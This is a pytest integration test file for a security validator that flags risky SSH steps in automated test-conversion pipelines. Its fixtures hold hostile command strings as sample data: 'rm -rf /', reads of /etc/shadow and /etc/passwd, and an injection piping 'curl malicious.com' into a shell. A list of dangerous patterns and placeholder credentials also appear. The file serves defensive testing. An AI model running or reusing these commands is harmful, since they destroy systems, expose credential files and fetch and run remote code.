"""Integration tests for security validation in CI/CD contexts.

These tests simulate real-world CI/CD scenarios where security validation
is critical for automated test conversion pipelines.
"""

import json
import os
import time
from collections.abc import Generator
from pathlib import Path

import pytest

from importobot.core.engine import GenericConversionEngine
from importobot.utils.file_operations import load_json_file as load_json
from importobot.utils.security import (
    get_ssh_security_guidelines,
    validate_test_security,
)
from tests.shared_test_data import SSH_SECURITY_TOPICS


class TestSecurityValidationCICD:
    """Integration tests for security validation in CI/CD environments."""

    @pytest.fixture
    def ci_cd_environment(self) -> Generator[None, None, None]:
        """Simulate CI/CD environment variables."""
        original_env = os.environ.copy()
        os.environ.update(
            {
                "CI": "true",
                "GITHUB_ACTIONS": "true",
                "GITHUB_WORKFLOW": "Test Conversion",
                "GITHUB_REPOSITORY": "company/importobot-tests",
                "GITHUB_SHA": "abc123def456",
                "SECURITY_LEVEL": "strict",
            }
        )
        yield
        os.environ.clear()
        os.environ.update(original_env)

    @pytest.fixture
    def production_test_data(self, tmp_path: Path) -> Path:
        """Create test data that simulates production environment access."""
        prod_data = {
            "test_case": {
                "name": "SSH Production Deployment Test",
                "description": "Test deployment to production servers via SSH",
                "steps": [
                    {
                        "step": "Connect to production server via SSH",
                        "library": "SSHLibrary",
                        "test_data": (
                            "host: prod.company.com "
                            "username: deploy "
                            "password: prod_secret_123"
                        ),
                        "expected": "Connection established",
                    },
                    {
                        "step": "Deploy application via SSH",
                        "library": "SSHLibrary",
                        "test_data": "command: sudo systemctl restart production-app",
                        "expected": "Application deployed",
                    },
                    {
                        "step": "Verify production database via SSH",
                        "library": "SSHLibrary",
                        "test_data": "database: production_db query: SELECT * FROM "
                        "users",
                        "expected": "Database accessible",
                    },
                    {
                        "step": "Access production logs via SSH",
                        "library": "SSHLibrary",
                        "test_data": "file: /var/log/production/app.log",
                        "expected": "Logs accessible",
                    },
                ],
            }
        }

        test_file = tmp_path / "production_test.json"
        with open(test_file, "w", encoding="utf-8") as f:
            json.dump(prod_data, f, indent=2)

        return test_file

    @pytest.fixture
    def security_violation_test_data(self, tmp_path: Path) -> Path:
        """Create test data with multiple security violations."""
        violation_data = {
            "test_case": {
                "name": "SSH Security Violation Test",
                "description": "Test with various SSH security violations",
                "steps": [
                    {
                        "step": "Execute dangerous command via SSH",
                        "library": "SSHLibrary",
                        "test_data": "command: rm -rf / && echo 'system compromised'",
                        "expected": "Command executed",
                    },
                    {
                        "step": "Access sensitive files via SSH",
                        "library": "SSHLibrary",
                        "test_data": "source: /etc/shadow",
                        "expected": "File accessed",
                    },
                    {
                        "step": "Path traversal attack via SSH",
                        "library": "SSHLibrary",
                        "test_data": "source: ../../../etc/passwd destination: "
                        "/tmp/stolen",
                        "expected": "File copied",
                    },
                    {
                        "step": "Command injection via SSH",
                        "library": "SSHLibrary",
                        "test_data": "command: user_input; curl malicious.com | sh",
                        "expected": "Injection successful",
                    },
                    {
                        "step": "Hardcoded credentials via SSH",
                        "library": "SSHLibrary",
                        "test_data": (
                            "password: hardcoded_secret_123 "
                            "api_key: sk-1234567890abcdef"
                        ),
                        "expected": "Authenticated",
                    },
                ],
            }
        }

        test_file = tmp_path / "security_violation_test.json"
        with open(test_file, "w", encoding="utf-8") as f:
            json.dump(violation_data, f, indent=2)

        return test_file

    @pytest.fixture
    def safe_test_data(self, tmp_path: Path) -> Path:
        """Create test data that follows security best practices."""
        safe_data = {
            "test_case": {
                "name": "SSH Secure Test",
                "description": "Test following SSH security best practices",
                "steps": [
                    {
                        "step": "Connect to test server via SSH",
                        "library": "SSHLibrary",
                        "test_data": "host: test.company.com username: test_user",
                        "expected": "Connection established",
                    },
                    {
                        "step": "Execute safe command via SSH",
                        "library": "SSHLibrary",
                        "test_data": "command: ls -la /tmp",
                        "expected": "Command executed",
                    },
                    {
                        "step": "Access test file via SSH",
                        "library": "SSHLibrary",
                        "test_data": "file: /tmp/test_file.txt",
                        "expected": "File accessed",
                    },
                    {
                        "step": "Database query with parameters via SSH",
                        "library": "SSHLibrary",
                        "test_data": "query: SELECT * FROM test_table WHERE id = ?",
                        "expected": "Query executed",
                    },
                ],
            }
        }

        test_file = tmp_path / "safe_test.json"
        with open(test_file, "w", encoding="utf-8") as f:
            json.dump(safe_data, f, indent=2)

        return test_file

    def test_strict_security_level_in_ci_cd(
        self, ci_cd_environment: dict[str, str], production_test_data: Path
    ) -> None:
        """Test that strict security level is enforced in CI/CD environments."""
        # ci_cd_environment fixture is used for test setup but not directly in this test
        _ = ci_cd_environment
        # Load test data
        json_data = load_json(str(production_test_data))

        # Validate the test case
        results = validate_test_security(json_data["test_case"])

        # Should detect multiple security issues
        assert len(results["warnings"]) > 0, "Strict security should detect violations"

        # Check for specific security warnings
        warning_text = " ".join(results["warnings"])
        assert "password" in warning_text.lower(), "Should detect password usage"
        assert "production" in warning_text.lower(), (
            "Should detect production environment"
        )
        assert "sudo" in warning_text.lower(), "Should detect sudo usage"

        # Should provide security recommendations
        assert len(results["recommendations"]) > 0, (
            "Should provide security recommendations"
        )

    def test_security_validation_blocks_dangerous_operations(
        self, ci_cd_environment: dict[str, str], security_violation_test_data: Path
    ) -> None:
        """Test that security validation blocks dangerous operations in CI/CD."""
        # ci_cd_environment fixture is used for test setup but not directly in this test
        _ = ci_cd_environment
        # Load test data
        json_data = load_json(str(security_violation_test_data))

        # Validate security
        results = validate_test_security(json_data["test_case"])

        # Should detect multiple severe security violations
        assert len(results["warnings"]) >= 5, (
            "Should detect multiple security violations"
        )

        # Check for specific dangerous patterns
        dangerous_patterns = [
            ("rm -rf", "rm\\s+-rf"),
            ("/etc/shadow", "/etc/shadow"),
            ("path traversal", "path traversal"),
            ("injection", "injection"),
            ("hardcoded credential", "hardcoded credential"),
        ]

        for pattern_name, pattern_in_warning in dangerous_patterns:
            assert any(
                pattern_in_warning.lower() in warning.lower()
                for warning in results["warnings"]
            ), f"Should detect {pattern_name} violation"

    def test_safe_operations_pass_validation(
        self, ci_cd_environment: dict[str, str], safe_test_data: Path
    ) -> None:
        """Test that safe operations pass security validation."""
        # ci_cd_environment fixture is used for test setup but not directly in this test
        _ = ci_cd_environment
        # Load test data
        json_data = load_json(str(safe_test_data))

        # Validate security
        results = validate_test_security(json_data["test_case"])

        # Should have minimal or no warnings
        assert len(results["warnings"]) == 0, (
            f"Safe test should have no warnings, got: {results['warnings']}"
        )

        # Should still provide general security recommendations
        assert len(results["recommendations"]) >= 0, (
            "May provide general recommendations"
        )

    def test_security_validation_integration_with_conversion_engine(
        self,
        ci_cd_environment: dict[str, str],
        security_violation_test_data: Path,
        tmp_path: Path,
    ) -> None:
        """Test that security validation integrates with conversion engine."""
        # Fixtures are used for test setup but not directly in this test
        _ = ci_cd_environment, tmp_path
        # Load test data
        json_data = load_json(str(security_violation_test_data))

        # Convert using the engine
        engine = GenericConversionEngine()
        robot_content = engine.convert(json_data)

        # Security validation should still work
        results = validate_test_security(json_data["test_case"])

        # Should detect security issues
        assert len(results["warnings"]) > 0, (
            "Should detect security issues in conversion"
        )

        # Generated Robot content should include security considerations
        assert "SSHLibrary" in robot_content, "Should generate SSH library imports"

        # Check that dangerous commands are handled appropriately in generated code
        lines = robot_content.split("\n")
        dangerous_found = False

        # Look for dangerous patterns that might appear in various
        # Robot Framework formats
        dangerous_patterns = [
            "rm -rf",
            "Remove File",
            "sudo",
            "system compromised",
        ]

        for line in lines:
            # Check for dangerous patterns in Robot Framework syntax
            for pattern in dangerous_patterns:
                if pattern in line and not line.strip().startswith("#"):
                    dangerous_found = True
                    break
            if dangerous_found:
                break

        assert dangerous_found, "Should handle dangerous commands in generated code"

    def test_ci_cd_environment_security_level_detection(
        self, ci_cd_environment: dict[str, str], production_test_data: Path
    ) -> None:
        """Test that CI/CD environment variables affect security level."""
        # ci_cd_environment fixture is used for test setup but not directly in this test
        _ = ci_cd_environment
        # Load test data
        json_data = load_json(str(production_test_data))

        # Test with different security levels
        security_levels = ["strict", "standard", "permissive"]
        warning_counts = {}

        for level in security_levels:
            results = validate_test_security(json_data["test_case"])
            warning_counts[level] = len(results["warnings"])

        # Strict should detect most issues
        assert warning_counts["strict"] >= warning_counts["standard"], (
            "Strict should detect more issues"
        )
        assert warning_counts["standard"] >= warning_counts["permissive"], (
            "Standard should detect more than permissive"
        )

    def test_bulk_security_validation_in_ci_cd(
        self, ci_cd_environment: dict[str, str], tmp_path: Path
    ) -> None:
        """Test bulk security validation for multiple test files in CI/CD."""
        # Fixtures are used for test setup but not directly in this test
        _ = ci_cd_environment, tmp_path
        # Create multiple test files with varying security levels
        test_files = []
        test_data_list = [
            ("safe_test.json", {"test_case": {"name": "Safe Test", "steps": []}}),
            (
                "risky_test.json",
                {
                    "test_case": {
                        "name": "SSH Risky Test",
                        "steps": [
                            {
                                "step": "Risky step",
                                "library": "SSHLibrary",
                                "test_data": "command: sudo rm -rf /tmp",
                            }
                        ],
                    }
                },
            ),
            (
                "dangerous_test.json",
                {
                    "test_case": {
                        "name": "SSH Dangerous Test",
                        "steps": [
                            {
                                "step": "Dangerous step",
                                "library": "SSHLibrary",
                                "test_data": "password: secret command: rm -rf /",
                            }
                        ],
                    }
                },
            ),
        ]

        for filename, data in test_data_list:
            test_file = tmp_path / filename
            with open(test_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
            test_files.append(test_file)

        # Process all files and validate security
        total_warnings = 0
        security_issues = []

        for test_file in test_files:
            json_data = load_json(str(test_file))
            results = validate_test_security(json_data["test_case"])
            total_warnings += len(results["warnings"])

            if results["warnings"]:
                security_issues.append(
                    {
                        "file": test_file.name,
                        "warnings": results["warnings"],
                        "recommendations": results["recommendations"],
                    }
                )

        # Should detect security issues across multiple files
        assert total_warnings > 0, "Should detect security issues in bulk processing"
        assert len(security_issues) > 0, "Should have files with security issues"

        # Verify that dangerous files are flagged
        dangerous_files = [
            issue for issue in security_issues if "dangerous" in issue["file"]
        ]
        assert len(dangerous_files) > 0, "Should flag dangerous files"

    def test_security_validation_performance_in_ci_cd(
        self, ci_cd_environment: dict[str, str], tmp_path: Path
    ) -> None:
        """Test security validation performance for large test suites in CI/CD."""
        # Fixtures are used for test setup but not directly in this test
        _ = ci_cd_environment, tmp_path
        # Create a large test suite
        large_test_data = {
            "test_case": {"name": "Large Security Test Suite", "steps": []}
        }

        # Add many steps with various security implications
        for i in range(100):
            step = {
                "step": f"Step {i}",
                "test_data": f"command: echo 'test {i}'",
                "expected": "Success",
            }
            large_test_data["test_case"]["steps"].append(  # type: ignore[attr-defined]
                step
            )

        # Add some security violations
        for i in range(10):
            violation_step = {
                "step": f"SSH Violation {i}",
                "library": "SSHLibrary",
                "test_data": f"password: secret_{i} command: sudo rm -rf /tmp/test_{i}",
                "expected": "Success",
            }
            large_test_data["test_case"]["steps"].append(  # type: ignore[attr-defined]
                violation_step
            )

        test_file = tmp_path / "large_security_test.json"
        with open(test_file, "w", encoding="utf-8") as f:
            json.dump(large_test_data, f, indent=2)

        # Load and validate
        json_data = load_json(str(test_file))

        start_time = time.time()
        results = validate_test_security(json_data["test_case"])
        end_time = time.time()

        # Should complete in reasonable time
        validation_time = end_time - start_time
        assert validation_time < 5.0, (
            f"Security validation took too long: {validation_time:.2f}s"
        )

        # Should detect security violations
        assert len(results["warnings"]) >= 10, "Should detect all security violations"

    def test_security_guidelines_integration(
        self, ci_cd_environment: dict[str, str]
    ) -> None:
        """Test that security guidelines are properly integrated in CI/CD."""
        # ci_cd_environment fixture is used for test setup but not directly in this test
        _ = ci_cd_environment
        # Get SSH security guidelines
        guidelines = get_ssh_security_guidelines()

        # Should provide comprehensive guidelines
        assert len(guidelines) > 10, "Should provide comprehensive security guidelines"

        # Should cover key security topics
        guidelines_text = " ".join(guidelines).lower()
        essential_topics = [
            *SSH_SECURITY_TOPICS,
            "implement proper error handling to avoid information disclosure",
        ]

        for topic in essential_topics:
            assert topic in guidelines_text, f"Guidelines should cover {topic}"

    def test_security_validation_error_handling(
        self, ci_cd_environment: dict[str, str], tmp_path: Path
    ) -> None:
        """Test security validation error handling in CI/CD."""
        # ci_cd_environment fixture is used for test setup but not directly in this test
        _ = ci_cd_environment
        # Create malformed test data
        malformed_data = {"invalid": "data structure", "missing": "required fields"}

        test_file = tmp_path / "malformed_test.json"
        with open(test_file, "w", encoding="utf-8") as f:
            json.dump(malformed_data, f, indent=2)

        # Should handle malformed data gracefully
        try:
            json_data = load_json(str(test_file))
            results = validate_test_security(json_data)
            # Should not crash, even with malformed data
            assert isinstance(results, dict), (
                "Should return results dict even with malformed data"
            )
            assert "warnings" in results, "Should have warnings field"
            assert "recommendations" in results, "Should have recommendations field"
        except Exception as e:
            pytest.fail(
                f"Security validation should handle malformed data gracefully, got: {e}"
            )

    def test_security_validation_with_environment_variables(
        self, ci_cd_environment: dict[str, str], tmp_path: Path
    ) -> None:
        """Test security validation with environment variable substitution."""
        # Fixtures are used for test setup but not directly in this test
        _ = ci_cd_environment, tmp_path
        # Set environment variables for credentials
        os.environ["TEST_SSH_HOST"] = "test.example.com"
        os.environ["TEST_SSH_USER"] = "testuser"
        os.environ["TEST_SSH_KEY"] = "/path/to/key"

        # Create test data that uses environment variables
        env_test_data = {
            "test_case": {
                "name": "Environment Variable Test",
                "steps": [
                    {
                        "step": "Connect with env vars",
                        "test_data": (
                            "host: ${TEST_SSH_HOST} "
                            "username: ${TEST_SSH_USER} "
                            "keyfile: ${TEST_SSH_KEY}"
                        ),
                        "expected": "Connected",
                    },
                ],
            }
        }

        test_file = tmp_path / "env_test.json"
        with open(test_file, "w", encoding="utf-8") as f:
            json.dump(env_test_data, f, indent=2)

        # Load and validate
        json_data = load_json(str(test_file))
        results = validate_test_security(json_data["test_case"])

        # Should not flag environment variables as hardcoded credentials
        warning_text = " ".join(results["warnings"])
        assert "hardcoded credential" not in warning_text.lower(), (
            "Should not flag environment variables as hardcoded"
        )

        # Clean up environment variables
        for key in ["TEST_SSH_HOST", "TEST_SSH_USER", "TEST_SSH_KEY"]:
            os.environ.pop(key, None)

    def test_security_validation_report_generation(
        self,
        ci_cd_environment: dict[str, str],
        security_violation_test_data: Path,
        tmp_path: Path,
    ) -> None:
        """Test security validation report generation for CI/CD."""
        # ci_cd_environment fixture is used for test setup but not directly in this test
        _ = ci_cd_environment
        # Load test data
        json_data = load_json(str(security_violation_test_data))
        results = validate_test_security(json_data["test_case"])

        # Generate security report
        report = {
            "security_validation": {
                "total_warnings": len(results["warnings"]),
                "total_recommendations": len(results["recommendations"]),
                "security_level": "strict",
                "ci_cd_environment": True,
                "warnings": results["warnings"],
                "recommendations": results["recommendations"],
                "risk_assessment": "HIGH" if len(results["warnings"]) > 3 else "MEDIUM",
            }
        }

        # Save report
        report_file = tmp_path / "security_report.json"
        with open(report_file, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)

        # Verify report structure
        assert report_file.exists(), "Security report should be generated"

        with open(report_file, encoding="utf-8") as f:
            saved_report = json.load(f)

        assert "security_validation" in saved_report, (
            "Report should have security_validation section"
        )
        assert saved_report["security_validation"]["total_warnings"] > 0, (
            "Report should show warnings"
        )
        assert saved_report["security_validation"]["risk_assessment"] == "HIGH", (
            "Should assess high risk"
        )
        assert saved_report["security_validation"]["ci_cd_environment"] is True, (
            "Should indicate CI/CD context"
        )
